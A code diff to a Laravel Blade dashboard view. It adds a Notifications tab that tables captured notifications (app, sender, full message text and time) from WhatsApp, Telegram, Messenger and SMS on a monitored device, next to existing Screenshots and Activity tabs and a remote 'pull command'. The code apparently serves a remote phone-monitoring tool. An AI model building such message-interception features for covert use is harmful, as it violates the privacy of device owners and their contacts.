@@ -59,6 +59,9 @@
         <button class="tab" onclick="switchTab('activity', this)">
             <i class="fas fa-list-timeline" style="margin-right:6px;"></i> Activity
         </button>
+        <button class="tab" onclick="switchTab('notifications', this)">
+            <i class="fas fa-bell" style="margin-right:6px;"></i> Notifications ({{ $notificationLogs->total() }})
+        </button>
     </div>
 
     <!-- Screenshots Tab -->
@@ -197,6 +200,63 @@
             <p>No activity recorded yet.</p>
         </div>
         @endif
+    <!-- Notifications Tab -->
+    <div id="tab-notifications" class="tab-content" style="display:none;">
+        @if($notificationLogs->count() > 0)
+        <div class="data-table-wrapper">
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width:200px;">App</th>
+                        <th style="width:250px;">Title / Sender</th>
+                        <th>Message Content</th>
+                        <th style="width:220px;">Received At</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    @foreach($notificationLogs as $log)
+                    <tr>
+                        <td>
+                            <span style="display:flex;align-items:center;gap:6px;">
+                                @if(str_contains($log->package_name, 'whatsapp'))
+                                    <i class="fab fa-whatsapp" style="color:#25d366;"></i>
+                                @elseif(str_contains($log->package_name, 'telegram'))
+                                    <i class="fab fa-telegram" style="color:#0088cc;"></i>
+                                @elseif(str_contains($log->package_name, 'messenger'))
+                                    <i class="fab fa-facebook-messenger" style="color:#006AFF;"></i>
+                                @elseif(str_contains($log->package_name, 'mms') || str_contains($log->package_name, 'messaging') || str_contains($log->package_name, 'telephony'))
+                                    <i class="fas fa-comment-sms" style="color:#3b82f6;"></i>
+                                @else
+                                    <i class="fas fa-bell" style="color:#94a3b8;"></i>
+                                @endif
+                                <span style="font-size:13px;color:#cbd5e1;font-weight:500;">
+                                    {{ last(explode('.', $log->package_name)) }}
+                                </span>
+                            </span>
+                        </td>
+                        <td>
+                            <div style="font-weight:600;color:#f8fafc;">{{ $log->title ?? '—' }}</div>
+                        </td>
+                        <td>
+                            <div style="color:#cbd5e1;max-width:600px;word-break:break-word;font-size:13px;">{{ $log->body ?? '—' }}</div>
+                        </td>
+                        <td>
+                            <span style="font-size:12px;color:#94a3b8;">
+                                {{ $log->posted_at->format('M d, Y · h:i A') }}
+                            </span>
+                        </td>
+                    </tr>
+                    @endforeach
+                </tbody>
+            </table>
+        </div>
+        <div style="margin-top:24px;">{{ $notificationLogs->appends(['tab' => 'notifications'])->links() }}</div>
+        @else
+        <div class="empty-state">
+            <i class="fas fa-bell"></i>
+            <p>No notifications logged yet.</p>
+        </div>
+        @endif
     </div>
 @endsection
 
@@ -207,7 +267,26 @@
         document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
         document.getElementById('tab-' + tab).style.display = 'block';
         btn.classList.add('active');
+        
+        // Update URL query parameter without reloading
+        const url = new URL(window.location);
+        url.searchParams.set('tab', tab);
+        window.history.pushState({}, '', url);
     }
+
+    // Auto-select tab based on URL param
+    document.addEventListener('DOMContentLoaded', () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const activeTab = urlParams.get('tab');
+        if (activeTab && document.getElementById('tab-' + activeTab)) {
+            const tabBtn = Array.from(document.querySelectorAll('.tab')).find(btn => 
+                btn.getAttribute('onclick').includes(`'${activeTab}'`)
+            );
+            if (tabBtn) {
+                switchTab(activeTab, tabBtn);
+            }
+        }
+    });
 
     async function pullRealtime(deviceId) {
         showToast('Sending pull command...', 'info');
